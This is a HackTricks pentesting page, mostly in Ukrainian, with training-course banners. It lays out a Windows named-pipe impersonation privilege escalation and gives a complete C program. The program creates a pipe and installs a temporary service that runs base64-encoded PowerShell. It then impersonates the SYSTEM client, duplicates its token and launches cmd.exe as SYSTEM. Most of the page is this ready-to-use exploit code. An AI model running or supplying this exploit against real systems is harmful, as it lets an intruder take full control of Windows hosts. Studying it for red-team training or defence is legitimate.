{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**Code flow:**

1. Створіть новий Pipe
2. Створіть і запустіть сервіс, який підключиться до створеного pipe і запише щось. Код сервісу виконає цей закодований PS код: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Сервіс отримує дані від клієнта в pipe, викликає ImpersonateNamedPipeClient і чекає, поки сервіс завершиться
4. Нарешті, використовує токен, отриманий від сервісу, щоб запустити новий _cmd.exe_

{% hint style="warning" %}
Якщо у вас недостатньо привілеїв, експлойт може застрягти і ніколи не повернутися.
{% endhint %}
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

int ServiceGo(void) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\\System32\\cmd.exe /rpowershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOA si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (bPipeConn) {
ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL);

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, LOGON_NETCREDENTIALS_ONLY, L"cmd.exe", NULL,
NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
